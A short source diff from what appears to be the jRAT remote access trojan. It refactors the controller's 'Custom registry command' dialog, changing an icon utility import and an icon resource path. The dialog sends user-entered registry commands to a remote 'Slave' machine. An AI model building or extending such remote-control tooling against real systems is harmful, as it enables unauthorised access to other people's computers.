@@ -1,6 +1,6 @@
 package jrat.controller.ui.dialogs;
 
-import iconlib.IconUtils;
+import jrat.api.Resources;
 import jrat.controller.Slave;
 import jrat.controller.packets.outgoing.Packet80CustomRegQuery;
 
@@ -22,7 +22,7 @@ public class DialogCustomRegQuery extends BaseDialog {
 	public DialogCustomRegQuery(Slave sl) {
 		super(sl);
 		setResizable(false);
-		setIconImage(Toolkit.getDefaultToolkit().getImage(DialogCustomRegQuery.class.getResource("/icons/key-arrow.png")));
+		setIconImage(Toolkit.getDefaultToolkit().getImage(DialogCustomRegQuery.class.getResource("/key-arrow.png")));
 		setTitle("Custom registry command");
 
 		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
@@ -41,7 +41,7 @@ public class DialogCustomRegQuery extends BaseDialog {
 				slave.addToSendQueue(new Packet80CustomRegQuery(comboBox.getSelectedItem().toString().trim()));
 			}
 		});
-		btnExecuteRegexeCommand.setIcon(IconUtils.getIcon("key-arrow"));
+		btnExecuteRegexeCommand.setIcon(Resources.getIcon("key-arrow"));
 		GroupLayout gl_contentPane = new GroupLayout(contentPane);
 		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addContainerGap().addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addComponent(comboBox, 0, 349, Short.MAX_VALUE).addComponent(btnExecuteRegexeCommand, Alignment.TRAILING)).addContainerGap()));
 		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addContainerGap().addComponent(comboBox, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED, 16, Short.MAX_VALUE).addComponent(btnExecuteRegexeCommand).addContainerGap()));
